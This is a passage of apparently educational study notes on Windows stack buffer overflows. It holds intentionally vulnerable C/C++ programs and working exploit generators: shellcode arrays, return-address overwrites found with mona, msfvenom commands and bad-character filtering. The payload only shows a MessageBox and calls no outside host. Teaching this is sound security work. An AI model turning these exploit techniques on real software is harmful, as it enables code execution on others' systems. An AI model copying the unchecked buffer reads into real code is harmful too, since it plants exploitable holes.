=<br>&quot;\xeb\x4e\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea&quot;<br>&quot;\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee&quot;<br>&quot;\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb&quot;<br>&quot;\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b&quot;<br>&quot;\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3&quot;<br>&quot;\x31\xc0\x64\x8b\x58\x30\x8b\x5b\x0c\x83\xc3\x1c\x8b\x1b\x8b\x4b&quot;<br>&quot;\x08\x8b\x53\x20\x38\x42\x18\x75\xf3\x68\x48\x4e\x0e\xec\x51\xe8&quot;<br>&quot;\x8e\xff\xff\xff\x68\x6c\x6c\x00\x00\x68\x72\x74\x2e\x64\x68\x6d&quot;<br>&quot;\x73\x76\x63\x54\xff\xd0\x68\x1e\x3c\xa7\xd5\x50\xe8\x71\xff\xff&quot;<br>&quot;\xff\x89\xc1\xc7\x44\x24\x04\x74\x1e\x48\xcd\xe8\x62\xff\xff\xff&quot;<br>&quot;\x89\xc2\x68\x21\x0a\x00\x00\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20&quot;<br>&quot;\x57\x68\x48\x65\x6c\x6c\x89\xe6\x31\xc0\x50\x52\x56\xff\xd1\x5a&quot;<br>&quot;\x5a\xff\xd2&quot;;<br>//NULL count: 4<br><br>typedef void (*FUNCPTR) ();<br><br>int main() &#123;<br>	printf(&quot;Starting to execute shellcode:\n&quot;);<br>	FUNCPTR fp = (FUNCPTR)shellcode;<br>	fp();<br>	<br>	printf(&quot;This line will not be displayed since we call exit()&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="3-7-Metasploit-Payload——Hello-World-MessageBox"><a href="#3-7-Metasploit-Payload——Hello-World-MessageBox" class="headerlink" title="3.7 - Metasploit Payload——Hello World! MessageBox()"></a>3.7 - Metasploit Payload——Hello World! MessageBox()</h2><h2 id="3-8-The-differences-of-Windows-Operating-Systems-x32-and-x64"><a href="#3-8-The-differences-of-Windows-Operating-Systems-x32-and-x64" class="headerlink" title="3.8 - The differences of Windows Operating Systems, x32 and x64"></a>3.8 - The differences of Windows Operating Systems, x32 and x64</h2><h1 id="Chapter-4-Practical-Attack"><a href="#Chapter-4-Practical-Attack" class="headerlink" title="Chapter 4 - Practical Attack"></a>Chapter 4 - Practical Attack</h1><h2 id="4-1-Different-Operating-Systems-and-Compilers"><a href="#4-1-Different-Operating-Systems-and-Compilers" class="headerlink" title="4.1 - Different Operating Systems and Compilers"></a>4.1 - Different Operating Systems and Compilers</h2><p>DEP stands for <strong>Data Execution Prevention</strong>.</p>
<p>ASLR stands for <strong>Address Space Layout Randomization</strong>.</p>
<h2 id="4-2-Example-C-Language"><a href="#4-2-Example-C-Language" class="headerlink" title="4.2 - Example: C Language"></a>4.2 - Example: C Language</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//vulnerable001.c<br>//filename: vulnerable001.c<br><br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br><br>void do_something(FILE *pfile) &#123;<br>	char buf[128];<br>	fscanf(pfile, &quot;%s&quot;, buf);<br>	<br>	//do file reading and parsing below<br>	//...<br>&#125;<br><br>int main(int argc, char* argv[]) &#123;<br>	char dummp[1024];<br>	FILE *pfile;<br>	<br>	printf(&quot;Vulnerable001 starts...&quot;);<br>	<br>	if (argc&gt;=2) pfile = fopen(argv[1], &quot;r&quot;);<br>	if (pfile) do_something(pfile);<br>	<br>	printf(&quot;Vulnerable001 ends...\n&quot;);<br>	<br>	return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;<br><br>int main() &#123;<br>	string junk(140, &#x27;A&#x27;);<br>	string eip(&quot;\xEF\xBE\xAD\xDE&quot;);<br>	string padding(&quot;BBBBCCCCDDDDEEEEFFFFGGGG&quot;);<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; padding;<br>	<br>	cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\nOK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.1.png'><img src="/images/books/bufferoverflow/4.1.png" width="800">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.2.png'><img src="/images/books/bufferoverflow/4.2.png" width="800">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.3.png'><img src="/images/books/bufferoverflow/4.3.png" width="800">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.4.png'><img src="/images/books/bufferoverflow/4.4.png" width="800">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.5.png'><img src="/images/books/bufferoverflow/4.5.png" width="800">
</p>

<p>We can use Immunity Debugger to find the opcode of <code>PUSH ESP # RETN</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona jmp -r esp<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.6.png'><img src="/images/books/bufferoverflow/4.6.png" width="800">
</p>

<p>Here we can use the address <code>0x7c874f13</code> (or others you want). Then our attack program is:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;<br><br>int main() &#123;<br>	string junk(140, &#x27;A&#x27;);<br>	string eip(&quot;\x13\x4f\x87\x7c&quot;); //0x7c874f13, little-endian<br>	string shellcode(&quot;\xcc\xcc\xcc\xcc&quot;); //shellcode<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; shellcode;<br>	<br>	cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;OK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.7.png'><img src="/images/books/bufferoverflow/4.7.png" width="800">
</p>

<p>Generate shellcode with <code>msfvenom</code> (<code>msfpayload</code> is used in this book. However, it has been deprecated and replaced by <code>msfvenom</code>).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">kali$ msfvenom -p windows/messagebox TEXT=&quot;Hello world&quot; TITLE=&quot;BOF Test&quot; -f c<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.8.png'><img src="/images/books/bufferoverflow/4.8.png" width="800">
</p>

<p><strong>Attack script:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;<br><br>char buf[] = <br>&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;<br>&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28&quot;<br>&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;<br>&quot;\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01&quot;<br>&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b&quot;<br>&quot;\x48\x18\x01\xd3\x50\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;<br>&quot;\xff\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;<br>&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;<br>&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;<br>&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;<br>&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00&quot;<br>&quot;\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c&quot;<br>&quot;\x77\x26\x07\xff\xd5\x6a\x00\xe8\x09\x00\x00\x00\x42\x4f&quot;<br>&quot;\x46\x20\x54\x65\x73\x74\x00\xe8\x0c\x00\x00\x00\x48\x65&quot;<br>&quot;\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x00\x6a\x00\x68\x45&quot;<br>&quot;\x83\x56\x07\xff\xd5\x6a\x00\x68\xf0\xb5\xa2\x56\xff\xd5&quot;;<br><br>int main() &#123;<br>	string junk(140, &#x27;A&#x27;);<br>	string eip(&quot;\x13\x4f\x87\x7c&quot;); //0x7c874f13, little-endian<br>	string debug(&quot;\xcc\xcc\xcc\xcc&quot;);<br>	string shellcode(buf); //shellcode<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; debug &lt;&lt; shellcode;<br>	<br>	cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\nOK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><br>Normally, we will be failed. The reason is our shellcode contains a <strong>null character (\x00)</strong>.</p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.9.png'><img src="/images/books/bufferoverflow/4.9.png" width="800">
</p>

<p>Now, lets solve this problem with <code>msfvenom</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/messagebox TEXT=&quot;Hello world&quot; TITLE=&quot;BOF Test&quot; -f c -b &#x27;\x0c\x0d\x20\x1a\x00\x0a\x0b&#x27;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.10.png'><img src="/images/books/bufferoverflow/4.10.png" width="800">
</p>

<p>Final attack script:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable001.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;string&gt;<br><br>using namespace std;<br><br>#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;<br><br>char buf[] = <br>&quot;\xb8\xd7\x13\x93\x1c\xda\xc3\xd9\x74\x24\xf4\x5a\x31\xc9&quot;<br>&quot;\xb1\x39\x31\x42\x12\x03\x42\x12\x83\x15\x17\x71\xe9\x65&quot;<br>&quot;\xf0\xfa\x12\x95\x01\x65\x9a\x70\x30\xb7\xf8\xf1\x61\x07&quot;<br>&quot;\x8a\x57\x8a\xec\xde\x43\x9d\x45\x94\x4d\x2a\xdb\x01\xa0&quot;<br>&quot;\xd3\x2d\x92\x6e\x17\x2f\x6e\x6c\x44\x8f\x4f\xbf\x99\xce&quot;<br>&quot;\x88\x76\xd7\x3f\x44\xdf\x9c\x92\x79\x54\xe0\x2e\x7b\xba&quot;<br>&quot;\x6e\x0e\x03\xbf\xb1\xfb\xbf\xbe\xe1\x8f\x08\xd8\x8a\xc8&quot;<br>&quot;\xa8\xd9\x5f\xb8\x2d\x10\x2b\x05\x67\x93\x2b\xfe\x43\x58&quot;<br>&quot;\xd2\xd7\x9d\x9e\x79\x16\x12\x13\x83\x5e\x95\xcb\xf6\x94&quot;<br>&quot;\xe5\x76\x01\x6f\x97\xac\x84\x70\x3f\x27\x3e\x55\xc1\xe4&quot;<br>&quot;\xd9\x1e\xcd\x41\xad\x79\xd2\x54\x62\xf2\xee\xdd\x85\xd5&quot;<br>&quot;\x66\xa5\xa1\xf1\x23\x7e\xcb\xa0\x89\xd1\xf4\xb3\x76\x8e&quot;<br>&quot;\x50\xbf\x95\xd9\xe5\x40\x66\xe6\xbb\x56\x92\x18\x44\xa7&quot;<br>&quot;\xd0\x6b\x21\xd5\x29\xb9\x87\x7d\x22\xd1\xd7\x15\xf6\x5e&quot;<br>&quot;\xfe\xe2\xf9\x75\x94\xec\xed\x7c\x69\xed\xed\x3c\x26\xab&quot;<br>&quot;\xcd\x94\xdd\x40\x7a\x14\xf6\xab\x82\x14\x06\xfc\xe7\x78&quot;<br>&quot;\x6a\x93\xc7\xf7\x1d\x19\x64\x93\xe1\xb7\x74\x33\xa7\xc4&quot;<br>&quot;\x23\xc4\xd8\x1e\xa1\xca\x4e\x51\x83\x68\xd8\x6e\x39&quot;;<br><br>int main() &#123;<br>	string junk(140, &#x27;A&#x27;);<br>	string eip(&quot;\x13\x4f\x87\x7c&quot;); //0x7c874f13, little-endian<br>	string debug(&quot;\xcc\xcc\xcc\xcc&quot;);<br>	string nops(8, &#x27;\x90&#x27;);<br>	string shellcode(buf); //shellcode<br>	<br>	ofstream fout(FILENAME, ios::binary);<br>	fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; nops &lt;&lt; shellcode;<br>	<br>	cout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\nOK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.11.png'><img src="/images/books/bufferoverflow/4.11.png" width="500">
</p>

<h2 id="4-3-Example-From-C-Language-to-C"><a href="#4-3-Example-From-C-Language-to-C" class="headerlink" title="4.3 - Example: From C Language to C++"></a>4.3 - Example: From C Language to C++</h2><p>We need to determine whether a buffer overflow vulnerability exists.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//vulnerable002.cpp<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br><br>using namespace std;<br><br>void do_something(ifstream&amp; fin) &#123;<br>	char buf[1024];<br>	fin &gt;&gt; buf;<br>&#125;<br><br>int main(int argc, char **argv) &#123;<br>	char dummy[1024];<br>	ifstream fin;<br>	cout &lt;&lt; &quot;Vulnerable002 starts...\n&quot;;<br>	<br>	if (argc&gt;=2) fin.open(argv[1]);<br>	if(fin) do_something(fin);<br>	<br>	cout &lt;&lt; &quot;Vulnerable002 ends...\n&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable002.cpp<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br>#include &lt;iostream&gt;<br><br>using namespace std;<br><br>#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;<br><br>int main() &#123;<br>	string junk(1100, &#x27;A&#x27;);<br>	<br>	ofstream fout(EXPLOIT_FILENAME);<br>	fout &lt;&lt; junk;<br>	<br>	cout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\nOK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.12.png'><img src="/images/books/bufferoverflow/4.12.png" width="800">
</p>

<p><code>[EIP]=41414141</code>. According to the result, a buffer overflow vulnerability exists.</p>
<p>Determine the offset:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona pattern_create 1100<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.13.png'><img src="/images/books/bufferoverflow/4.13.png" width="800">
</p>

<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.14.png'><img src="/images/books/bufferoverflow/4.14.png" width="600">
</p>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona pattern_offset 69423569<br></code></pre></td></tr></table></figure>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.15.png'><img src="/images/books/bufferoverflow/4.15.png" width="800">
</p>

<p>Hence, the offset is <code>1036</code>.</p>
<p>Attack script:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable002.cpp<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br>#include &lt;iostream&gt;<br><br>using namespace std;<br><br>#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;<br><br>int main() &#123;<br>	string junk(1036, &#x27;A&#x27;);<br>	string eip(&quot;\xef\xbe\xad\xde&quot;);<br>	string postdata(&quot;BBBBCCCCDDDDEEEEFFFF&quot;);<br>	<br>	ofstream fout(EXPLOIT_FILENAME);<br>	fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; postdata;<br>	<br>	cout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\nOK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.16.png'><img src="/images/books/bufferoverflow/4.16.png" width="600">
</p>

<p>Our exploitation is successful.</p>
<p>Now, we neeed to obtain the opcode of <code>PUSH ESP # RET</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">!mona jmp -r esp<br></code></pre></td></tr></table></figure></p>
<p align="center" class='item-img' data-src='/images/books/bufferoverflow/4.17.png'><img src="/images/books/bufferoverflow/4.17.png" width="800">
</p>

<p>Here, we are going to use <code>0x7c836b80</code>. This is the value for <code>EIP</code>. Thus, our exploit script is:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//attack-vulnerable002.cpp<br>#include &lt;string&gt;<br>#include &lt;fstream&gt;<br>#include &lt;iostream&gt;<br><br>using namespace std;<br><br>#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;<br><br>char buf[] = <br>&quot;\xb8\xd7\x13\x93\x1c\xda\xc3\xd9\x74\x24\xf4\x5a\x31\xc9&quot;<br>&quot;\xb1\x39\x31\x42\x12\x03\x42\x12\x83\x15\x17\x71\xe9\x65&quot;<br>&quot;\xf0\xfa\x12\x95\x01\x65\x9a\x70\x30\xb7\xf8\xf1\x61\x07&quot;<br>&quot;\x8a\x57\x8a\xec\xde\x43\x9d\x45\x94\x4d\x2a\xdb\x01\xa0&quot;<br>&quot;\xd3\x2d\x92\x6e\x17\x2f\x6e\x6c\x44\x8f\x4f\xbf\x99\xce&quot;<br>&quot;\x88\x76\xd7\x3f\x44\xdf\x9c\x92\x79\x54\xe0\x2e\x7b\xba&quot;<br>&quot;\x6e\x0e\x03\xbf\xb1\xfb\xbf\xbe\xe1\x8f\x08\xd8\x8a\xc8&quot;<br>&quot;\xa8\xd9\x5f\xb8\x2d\x10\x2b\x05\x67\x93\x2b\xfe\x43\x58&quot;<br>&quot;\xd2\xd7\x9d\x9e\x79\x16\x12\x13\x83\x5e\x95\xcb\xf6\x94&quot;<br>&quot;\xe5\x76\x01\x6f\x97\xac\x84\x70\x3f\x27\x3e\x55\xc1\xe4&quot;<br>&quot;\xd9\x1e\xcd\x41\xad\x79\xd2\x54\x62\xf2\xee\xdd\x85\xd5&quot;<br>&quot;\x66\xa5\xa1\xf1\x23\x7e\xcb\xa0\x89\xd1\xf4\xb3\x76\x8e&quot;<br>&quot;\x50\xbf\x95\xd9\xe5\x40\x66\xe6\xbb\x56\x92\x18\x44\xa7&quot;<br>&quot;\xd0\x6b\x21\xd5\x29\xb9\x87\x7d\x22\xd1\xd7\x15\xf6\x5e&quot;<br>&quot;\xfe\xe2\xf9\x75\x94\xec\xed\x7c\x69\xed\xed\x3c\x26\xab&quot;<br>&quot;\xcd\x94\xdd\x40\x7a\x14\xf6\xab\x82\x14\x06\xfc\xe7\x78&quot;<br>&quot;\x6a\x93\xc7\xf7\x1d\x19\x64\x93\xe1\xb7\x74\x33\xa7\xc4&quot;<br>&quot;\x23\xc4\xd8\x1e\xa1\xca\x4e\x51\x83\x68\xd8\x6e\x39&quot;;<br><br>int main() &#123;<br>	string junk(1036, &#x27;A&#x27;);<br>	string eip(&quot;\x80\x6b\x83\x7c&quot;);<br>	string debug(&quot;\xcc\xcc\xcc\xcc&quot;);<br>	string nops(8, &#x27;\x90&#x27;);<br>	string shellcode(buf);<br>	<br>	ofstream fout(EXPLOIT_FILENAME, ios::binary);<br>	fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; debug &lt;&lt; nops &lt;&lt; shellcode;<br>	<br>	cout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\nOK&quot;;<br>&#125;<br></code></pre></td></tr></table></figure></p>
<h2 id="4-4-Example-Attacking-Network-Applications"><a href="#4-4-Example-Attacking-Network-Applications" class="headerlink" title="4.4 - Example: Attacking Network Applications"></a>4.4 - Example: Attacking Network Applications</h2><h2 id="4-5-Practice-KMPlayer"><a href="#4-5-Practice-KMPlayer" class="headerlink" title="4.5 - Practice: KMPlayer"></a>4.5 - Practice: KMPlayer</h2><h2 id="4-6-Practice-DVD-X-Player"><a href="#4-6-Practice-DVD-X-Player" class="headerlink" title="4.6 - Practice: DVD X Player"></a>4.6 - Practice: DVD X Player</h2><h2 id="4-7-Practice-Easy-File-Sharing-FTP-Server"><a href="#4-7-Practice-Easy-File-Sharing-FTP-Server" class="headerlink" title="4.7 - Practice: Easy File Sharing FTP Server"></a>4.7 - Practice: Easy File Sharing FTP Server</h2><h2 id="4-8-Practice-Apple-QuickTime"><a href="#4-8-Practice-Apple-QuickTime" class="headerlink" title="4.8 - Practice: Apple QuickTime"></a>4.8 - Practice: Apple QuickTime</h2><h1 id="Chapter-5-Changes-of-Attacking"><a href="#Chapter-5-Changes-of-Attacking" class="headerlink" title="Chapter 5 - Changes of Attacking"></a>Chapter 5 - Changes of Attacking</h1><h2 id="5-1-Principles-of-Exception-Handling-Attack"><a href="#5-1-Principles-of-Exception-Handling-Attack" class="headerlink" title="5.1 - Principles of Exception Handling Attack"></a>5.1 - Principles of Exception Handling Attack</h2><p>We build the following project with VC++<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//TestException.cpp<br>#include &lt;cstdio&gt;	//for printf()<br>#include &lt;cstdlib&gt;	//for system()<br><br>int main() &#123;<br>	__try &#123;<br>		__asm&#123;NOP&#125;<br>		*(int*)0 = 0;<br>	&#125;<br>	__except(1) &#123;<br>		__asm&#123;NOP&#125;<br>		printf(&quot;got an exception\n&quot;);<br>	&#125;<br><br>	system(&quot;pause&quot;);<br>&#125;<br></code></pre></td></tr></table></figure></p>
<hr>
